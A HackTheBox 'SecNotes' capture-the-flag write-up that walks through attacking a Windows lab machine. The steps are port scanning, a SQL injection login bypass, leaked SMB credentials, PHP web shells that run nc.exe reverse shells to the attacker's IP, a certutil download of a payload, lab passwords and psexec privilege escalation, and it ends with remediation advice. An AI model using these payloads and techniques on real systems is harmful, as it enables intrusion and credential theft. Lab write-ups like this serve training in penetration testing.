---
title: SecNote Writeup | Without Metasploit
date: 2021-09-08
categories: [WriteUp, HackTheBox]
tags: [HackTheBox, WriteUp, OSCP, TJNULLs List] 
---

---
IP : Dynamic (HTB+)
OS : Windows
Difficulty : Medium

Covered Issues : SQLi, psexec, Win PrivEsc,

Tools Used : nmap, nikto, smbclient, psexec.py, ncat, winpeas and linpeas.

----
----

#### Enumeration
```sql
# port scan
$ nmap -A 10.129.218.160 | tee nmapA

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 06:16 EDT
Nmap scan report for 10.129.218.160
Host is up (0.25s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2021-09-10T03:16:33-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-10T10:16:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.48 seconds
```

```sql
# all port check
$ nmap -Pn -T4 -p- 10.129.218.160 | tee nmap_all_ports_ping
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 06:15 EDT
Nmap scan report for 10.129.218.160
Host is up (0.26s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 559.67 seconds
--------------------------------------------------------------------------------------------------
$ nmap -p 8808 -A 10.129.218.160 | tee nmap-8808                                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 06:26 EDT
Nmap scan report for 10.129.218.160
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
8808/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.54 second
```

```bash
# nikto scan | nothing intresting found
$ nikto -h 10.129.218.160 80 | tee nikto

# enum4linux | nothing intresting | no null session login
$ enum4linux 10.129.218.160 | tee enum4linux
```

#### More Enumeration | Web Enumeration
```bash
# nothing intresting found
$ dirsearch -u http://10.129.218.160:80/ -t 50 -e php
```
![alt](/assets/Images_P3_SecNotes/SecNote_1.png)

```bash
# nothing intresting found | Only Windows IIS Server Default Page
$ dirsearch -u http://10.129.218.160:8808/ -t 50
```

----
----
#### Important Notes
> `OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)`
> `SMB Enabled. Null session login is not possible.`
> `Microsoft IIS httpd 10.0 | Running php server application`
> `Unusual Port 8808 | Running Windows IIS Server`
----
----

#### Web Enumeration
Found potential user valid user's email. `tyler@secnotes.htb`

![alt](/assets/Images_P3_SecNotes/SecNote_2.png)
![alt](/assets/Images_P3_SecNotes/SecNote_3.png)


At Registration Page
`http://10.129.218.160/register.php`
It was possible to register with username and password of `'or 1=1##`. Which lead to SQL Injection. Gave access to all the notes.
And found potential credentials of SMB.
```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

![alt](/assets/Images_P3_SecNotes/SecNote_4.png)

#### Weaponizing Exploitation Tool

SMB access was possible with this credentials.  This smb lead to webroot directory of `http://10.129.218.160:8808/`. 
Writing files to this directory was possible.
![alt](/assets/Images_P3_SecNotes/SecNote_5.png)

Creating `ps.php` and `cmd.php`  as malicious code with `nc.exe` as reverse shell payload. And putting it into SMB file share.
```php
# ps.php
<?php
	system('nc.exe -e powershell.exe 10.10.17.81 4444');
	echo "Payload Executing";
?>
```

```php
# cmd.php
<?php
	system('nc.exe -e cmd.exe 10.10.17.81 5555');
	echo "Payload Executing";
?>
```

![alt](/assets/Images_P3_SecNotes/SecNote_6.png)

----
----

#### Exploitation
After putting `ps.php` and `cmd.php`  into SMB file share. We have to start 2 listeners at port `4444` and `5555` to catch reverse shell.
And try to access `ps.php` and `cmd.php`  from `http://10.129.218.160:8808/cmd.php` and `http://10.129.218.160:8808/ps.php`

```bash
$ rlwrap ncat -lvnp 4444
$ rlwrap ncat -lvnp 5555
```

![alt](/assets/Images_P3_SecNotes/SecNote_7.png)

----
----

#### Privilege Escalation | Enumeration and Exploitation
After transferring `winpeas.exe`.
`systeminfo` and `winpeas.exe` is not allowed to execute. **Windows defender is running.**
Similarly, `winpeas.bat` is also not allowed to execute.
![alt](/assets/Images_P3_SecNotes/SecNote_8.png)


A possibility that WSL with Ubuntu is installed in this system.
![alt](/assets/Images_P3_SecNotes/SecNote_9.png)

Getting confirmation of installation of WSL Ubuntu with direct execution of found programs with parameters.
```
C:\>where /R C:\Windows\WinSxS\ bash.exe
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe

C:\>where /R C:\Windows\ wsl.exe
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
```
![alt](/assets/Images_P3_SecNotes/SecNote_10.png)

*Found windows administrator password in bash history*
```
administrator
pass : u6!4ZwgwOM#^OBf#Nwnh
```
![alt](/assets/Images_P3_SecNotes/SecNote_11.png)

Using `psexec.py` privilege escalation got successful. 
```bash
$ psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.218.160
```
![alt](/assets/Images_P3_SecNotes/SecNote_12.png)

----
----

#### Post Exploitation

For better stable shell, transferring `nc.exe` and getting reverse shell back from `impacket` shell session to `ncat`.
```bash
# From Windows Machine
> certutil.exe -urlcache -f http://10.10.17.81:8000/nc.exe nc.exe

# From Attacker Machine
$ rlwrap ncat -lvnp 7777
```

![alt](/assets/Images_P3_SecNotes/SecNote_13.png)

*Collecting Flag*
```
user flag : type C:\Users\tyler\Desktop\user.txt
root flag : type C:\Users\Administrator\Desktop\ root.txt

```

```
Collected Hashes or Credentials

Found Harcoded Credentials from C:\inetpub\wwwroot\db.php
DB_SERVER : 'localhost'
DB_USERNAME : 'secnotes
DB_PASSWORD : 'q8N#9Eos%JinE57tke72'

DB_USERNAME : 'root'
DB_PASSWORD : 'qwer1234QWER!@#$'
DB_NAME : 'secnotes'

```

*Persistence*
- It was possible to transfer `linpeas.sh` into wsl system and run it there to enumerate entire system as root privileges.
![alt](/assets/Images_P3_SecNotes/SecNote_14.png)
- a backdoor user can be created with least chance of suspicion with ssh access.

----
----

####  *Remediation Advise*
- SecNotes app has SQLi bug. It needs to be fixed on priority.
- Disable SMB Service
- Critical credentials should not be posted in webapplication.
- Access should be restricted for WSL.
- IIS Web Server running on port 8808 should be disabled.
----
----
